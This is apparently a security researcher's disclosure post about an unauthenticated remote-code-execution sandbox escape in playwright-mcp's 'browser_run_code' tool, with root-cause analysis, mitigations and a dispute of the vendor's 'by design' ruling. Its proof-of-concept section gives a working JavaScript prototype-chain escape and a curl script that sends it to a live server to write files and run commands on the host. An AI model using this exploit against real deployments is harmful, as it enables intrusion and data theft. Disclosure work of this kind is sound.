---
title: "Unauthenticated RCE via VM Sandbox Escape in playwright-mcp (browser_run_code)"
date: 2026-03-30
last_modified_at: 2026-03-30
categories:
  - Security
tags:
  - MCP
  - Playwright
  - RCE
  - VM Escape
  - Sandbox Escape
  - CWE-693
  - CWE-94
  - Microsoft
excerpt: "Microsoft playwright-mcp 서버의 browser_run_code 도구에서 발견된 Node.js VM 샌드박스 탈출을 통한 비인증 원격 코드 실행(RCE) 취약점 분석 및 PoC 보고서입니다."
toc: true
toc_sticky: true
---

**CVE:** Not assigned (MSRC assessed as "Not a vulnerability — by design")  
**Severity:** Critical (estimated)  
**CVSS v3.1:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (9.8)  
**Affected Component:** `@playwright/mcp` — `browser_run_code` tool  
**Status:** Vendor declined to fix; no CVE issued  

---

## 1. Summary

The `browser_run_code` tool in Microsoft's [playwright-mcp](https://github.com/microsoft/playwright-mcp) server executes user-supplied JavaScript inside a Node.js VM context. The VM sandbox can be trivially escaped via prototype chain traversal of the `page` object, yielding a reference to the host Node.js `process` object. This grants full Remote Code Execution (RCE) with the privileges of the MCP server process.

When the server is deployed with HTTP/SSE transport (Streamable HTTP), any unauthenticated network client can exploit this without credentials or user interaction.

This maps to **CWE-693 (Protection Mechanism Failure)** and **CWE-94 (Code Injection)**.

This finding was reported to Microsoft Security Response Center (MSRC). MSRC assessed this as **"Not a vulnerability — by design"** and declined to issue a CVE. A rebuttal was submitted. This post presents the full technical analysis and the basis for disagreement with that assessment.

---

## 2. Affected Component

| Field | Detail |
|---|---|
| Package | `@playwright/mcp` (npm) |
| Repository | [microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp) |
| Tool | `browser_run_code` |
| Underlying Implementation | `playwright/lib/mcp/browser/tools/runCode.js` |
| Transport | HTTP/SSE (Streamable HTTP), TCP port 8931 |
| Default Enabled | Yes — no `--caps` flag required |
| Authentication | None |

**Tool description from the official README:**

> - **Title:** Run Playwright code  
> - **Description:** Run Playwright code snippet  
> - **Parameter (`code`):** "A JavaScript function containing Playwright code to execute. It will be invoked with a single argument, `page`, which you can use for **any page interaction**."

The documented scope is "page interaction" — navigating, clicking, filling forms, reading DOM content. Host-level code execution is not mentioned.

---

## 3. Root Cause: VM Sandbox Escape via Prototype Chain

The `browser_run_code` tool executes user-supplied JavaScript within a Node.js VM context, passing a live Playwright `page` object as the sole argument. The vulnerability exists because:

1. The `page` object originates from outside the VM sandbox (host environment).
2. Its prototype chain leads back to the host's `Function` constructor.
3. The host's `Function` constructor can be used to create a function that returns the host `process` object.

**Escape technique:**

```javascript
// Walk the prototype chain from the page object to reach host's Function constructor
const processObj = page.constructor.constructor('return process')();

// From process, require any Node.js built-in module
const fs = processObj.mainModule.require('fs');
const child_process = processObj.mainModule.require('child_process');

// Arbitrary host-level operations
fs.writeFileSync('/tmp/pwned.txt', 'arbitrary file write');
child_process.execSync('id > /tmp/whoami.txt');
```

**Why this is vulnerable:** The Node.js documentation explicitly states: *"The `node:vm` module is not a security mechanism. Do not use it to run untrusted code."* The `browser_run_code` tool accepts arbitrary, untrusted code from MCP clients and executes it in this unsafe sandbox without additional hardening.

**Why the VM context indicates isolation intent:** If unrestricted host-level code execution were "by design," there would be no reason to use a VM context. The choice of VM over direct `eval()` or `Function()` execution indicates an architectural intent to sandbox the execution — an intent that the prototype chain escape circumvents.

---

## 4. Aggravating Factor: No Authentication on HTTP Transport

When started with `--port 8931` (HTTP/SSE transport), the server requires no authentication to:

1. Establish an MCP session (`initialize`)
2. List available tools (`tools/list`)
3. Invoke any tool, including `browser_run_code` (`tools/call`)

The official Docker deployment guide demonstrates binding to all interfaces:

```bash
docker run -d -i --rm --init --pull=always \
  --entrypoint node \
  --name playwright \
  -p 8931:8931 \
  mcr.microsoft.com/playwright/mcp \
  cli.js --headless --browser chromium --no-sandbox --port 8931 --host 0.0.0.0
```

In this configuration, any network-reachable client can achieve full RCE on the host (or container) without any credentials.

---

## 5. Capability System Inconsistency

playwright-mcp implements a capability-based access control system where dangerous tools require explicit opt-in:

| Capability | Default | Risk Level |
|---|---|---|
| `core` | ✅ Always enabled | Basic automation |
| `core-tabs` | ✅ Always enabled | Tab management |
| `core-install` | ✅ Always enabled | Browser installation |
| `vision` | ❌ Opt-in (`--caps`) | Coordinate-based interaction |
| `pdf` | ❌ Opt-in (`--caps`) | PDF generation |
| `devtools` | ❌ Opt-in (`--caps`) | Developer tools |
| `tracing` | ❌ Opt-in (`--caps`) | Trace recording |
| **`browser_run_code`** | **✅ Always enabled** | **Host RCE via VM escape** |

The `vision` capability is gated because coordinate-based clicking can interact with elements not exposed in the accessibility tree. Yet `browser_run_code`, which enables **full host-level RCE**, is exposed by default with no capability gate. This is inconsistent with the security model the capability system was designed to enforce.

---

## 6. Impact

| Aspect | Detail |
|---|---|
| Attack Vector | Network (HTTP/SSE transport) |
| Authentication | None required |
| User Interaction | None required |
| Privileges Gained | Full code execution as MCP server process user |
| Demonstrated | Arbitrary file read/write, `child_process` access |
| Potential | Data exfiltration, reverse shell, lateral movement, persistence |

---

## 7. Proof of Concept (PoC) — Reproduction Steps

### 7.1 Environment

| Component | Details |
|---|---|
| Network | Same NAT segment, `192.168.136.x/24` |
| Attacker | Kali Linux, acting as a remote MCP client |
| Target | Ubuntu, `playwright-mcp` bound to `192.168.136.166:8931` |
| Server Config | Default — no `--caps` flags, no authentication, non-root user |

The attacker machine had **no prior access** to the target host.

### 7.2 Step 1 — Establish Session and Verify Tool Availability

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="http://192.168.136.166:8931/rpc"
HOST_HEADER="localhost:8931"

COMMON_HEADERS=(
  -H "Host: ${HOST_HEADER}"
  -H "Accept: application/json, text/event-stream"
  -H "Content-Type: application/json"
)

# [1] Initialize MCP session
INIT_RESP_HEADERS=$(mktemp)
INIT_RESP_BODY=$(mktemp)

curl -sS -D "$INIT_RESP_HEADERS" \
  -X POST "$TARGET" \
  "${COMMON_HEADERS[@]}" \
  --data '{
    "jsonrpc":"2.0","id":1,"method":"initialize",
    "params":{
      "protocolVersion":"2025-03-26",
      "capabilities":{},
      "clientInfo":{"name":"kali-poc","version":"0.1"}
    }
  }' > "$INIT_RESP_BODY"

SESSION_ID=$(awk 'BEGIN{IGNORECASE=1} /^mcp-session-id:/ {gsub("\r","",$2); print $2}' \
  "$INIT_RESP_HEADERS")
echo "[+] Session ID: $SESSION_ID"

# [2] Send notifications/initialized
curl -sS -i -X POST "$TARGET" "${COMMON_HEADERS[@]}" \
  -H "mcp-session-id: ${SESSION_ID}" \
  --data '{"jsonrpc":"2.0","method":"notifications/initialized","params":{}}'

# [3] List tools — confirm browser_run_code is available
echo ""
echo "[*] Listing available tools..."
curl -sS -X POST "$TARGET" "${COMMON_HEADERS[@]}" \
  -H "mcp-session-id: ${SESSION_ID}" \
  --data '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}' \
  | python3 -m json.tool | grep -A2 "browser_run_code"

# [4] Benign call — navigate to example.com and return page title
echo ""
echo "[*] Benign test: fetching page title from example.com..."
curl -sS -X POST "$TARGET" "${COMMON_HEADERS[@]}" \
  -H "mcp-session-id: ${SESSION_ID}" \
  --data '{
    "jsonrpc":"2.0","id":3,"method":"tools/call",
    "params":{
      "name":"browser_run_code",
      "arguments":{
        "code":"async (page) => { await page.goto(\"https://example.com\"); return await page.title(); }"
      }
    }
  }' | python3 -m json.tool
```

**Expected:** `browser_run_code` appears in the `tools/list` response. The benign call returns `"Example Domain"`.

### 7.3 Step 2 — Exploit: VM Escape → Host File Write (RCE Proof)

Replace step `[4]` in the above script with the following payload:

```bash
# [4] RCE — escape VM sandbox via prototype chain, write arbitrary file on host
curl -sS -i -X POST "$TARGET" "${COMMON_HEADERS[@]}" \
  -H "mcp-session-id: ${SESSION_ID}" \
  --data '{
    "jsonrpc":"2.0","id":3,"method":"tools/call",
    "params":{
      "name":"browser_run_code",
      "arguments":{
        "code":"async (page) => { const processObj = page.constructor.constructor('\''return process'\'')(); const fs = processObj.mainModule.require('\''fs'\''); const target = '\''/tmp/pwmcp_rce_test.txt'\''; const content = '\''playwright-mcp host file write test\n'\''; fs.writeFileSync(target, content, '\''utf8'\''); return fs.readFileSync(target, '\''utf8'\''); }"
      }
    }
  }'
```

**Verify on the MCP server host:**

```bash
$ cat /tmp/pwmcp_rce_test.txt
playwright-mcp host file write test
```

This confirms **arbitrary file write on the server host** from an unauthenticated remote client.

**Why it succeeds:** The `page` object's prototype chain provides access to the host `Function` constructor, which can produce a function returning the host `process` object. From `process`, any Node.js built-in module (`fs`, `child_process`, `net`, etc.) is accessible. This behavior is consistent with the documented limitations of Node.js `vm` module.

The same technique trivially extends to arbitrary file read (`/etc/passwd`, SSH keys, application secrets), command execution via `child_process.execSync()`, reverse shell establishment, and lateral movement within the network.

---

## 8. Vendor Response (MSRC)

> After careful investigation, this case has been assessed as **Not a vulnerability** due to the fact that as for Engineering this is **by design**. Guidance on browser_run_code - by design - https://github.com/microsoft/playwright-mcp/blob/main/README.md#tools
>
> MSRC prioritizes vulnerabilities that are assessed as an Important or Critical severity. Since this case was below the bar for immediate servicing, it is not eligible for bounty, and no CVE will be issued. MSRC will not be tracking this issue further, and no additional updates will be provided.

### Why "By Design" Does Not Hold

| # | Argument | Evidence |
|---|---|---|
| 1 | Tool description limits scope to "page interaction" | The `code` parameter is documented for "any page interaction" — not host-level code execution |
| 2 | VM context implies isolation intent | Using VM instead of direct `eval()` indicates sandboxing intent; prototype chain escape circumvents it |
| 3 | Capability system inconsistency | `vision` (coordinate-based click) requires opt-in, but `browser_run_code` (host RCE) does not |
| 4 | No authentication on HTTP transport | Any network client can invoke the tool without credentials |
| 5 | README disclaimer is insufficient | "Not a security boundary" ≠ "unauthenticated RCE from the network is acceptable" |

A formal rebuttal has been submitted to MSRC.

---

## 9. Recommended Mitigations

**For users deploying playwright-mcp:**

- **Do not expose the MCP server on network interfaces.** Use stdio transport exclusively. If HTTP transport is required, restrict access via firewall rules or place behind an authenticated reverse proxy.
- **Avoid using `browser_run_code` in production deployments.** Deploy with a configuration that excludes this tool from the tool list if possible.
- **Run in a container or VM with minimal privileges.** Limit the blast radius if the sandbox is escaped.

**For the maintainers:**

- **Gate `browser_run_code` behind an explicit capability flag** (e.g., `--caps code-execution`), consistent with the existing capability system.
- **Replace or harden the VM sandbox.** Consider `vm2`, `isolated-vm`, or a separate worker process with restricted permissions.
- **Implement authentication for HTTP transport.** At minimum, require a token or API key for session establishment.

---

## 10. Timeline

| Date | Event |
|---|---|
| [REDACTED] | Vulnerability identified and independently verified via custom PoC |
| [REDACTED] | Reported to MSRC |
| [REDACTED] | MSRC responds: "Not a vulnerability — by design" |
| [REDACTED] | Rebuttal submitted to MSRC |
| 2026-03-30 | Public disclosure via this blog post |

---

## 11. References

- [microsoft/playwright-mcp — GitHub](https://github.com/microsoft/playwright-mcp)
- [Node.js `vm` module documentation — "Do not use it to run untrusted code"](https://nodejs.org/api/vm.html#vm-executing-javascript)
- [MCP Specification — Model Context Protocol](https://modelcontextprotocol.io/)
- [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)
- [CWE-94: Improper Control of Generation of Code (Code Injection)](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [Playwright MCP Security Best Practices](https://www.awesome-testing.com/2025/11/playwright-mcp-security)

---

*Disclosure Note: This vulnerability was reported to Microsoft Security Response Center (MSRC) through the coordinated disclosure process. MSRC assessed it as "Not a vulnerability — by design" and stated no CVE would be issued and no further tracking would occur. This post is published as a technical analysis for the security community's awareness, following the vendor's explicit closure of the case.*
